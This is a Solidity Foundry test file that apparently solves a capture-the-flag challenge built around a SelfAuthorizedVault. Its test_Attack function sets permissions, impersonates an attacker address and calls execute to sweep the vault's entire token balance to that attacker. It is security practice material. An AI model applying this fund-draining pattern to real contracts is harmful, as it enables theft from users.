// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console2, console} from "forge-std/Test.sol";
import {AuthorizedExecutor} from "../src/AuthorizedExecutor.sol";
import {DamnValuableToken} from "../src/DamnValuableToken.sol";

import {UtilsTest} from "./Utils.t.sol";

contract SelfAuthorizedVaultTest is UtilsTest {
    bytes32[] ids = new bytes32[](1);
    address attackerAddress = makeAddr("attacker Address");
    function setUp() public override {
        super.setUp();
    }

    function test_vaultFunds() public {
        token.balanceOf(address(vault));

        assertEq(token.balanceOf(address(vault)), 1000000 ether);
        assertEq(token.balanceOf(address(token)), 0 ether);
    }

    function test_setPermission() public {}

    function test_Attack() public {
        ids[0] = keccak256(
            abi.encodePacked(
                vault.sweepFunds.selector,
                attackerAddress,
                address(vault)
            )
        );

        vault.setPermissions(ids);

        bytes memory actionData = abi.encodeWithSelector(
            vault.sweepFunds.selector,
            attackerAddress,
            token
        );

        vault.getActionId(
            bytes4(vault.sweepFunds.selector),
            attackerAddress,
            address(vault)
        );

        vm.startPrank(attackerAddress);

        vault.execute(address(vault), actionData);

        assertEq(token.balanceOf(address(vault)), 0);
        assertEq(token.balanceOf(attackerAddress), 1000000 ether);
    }
}
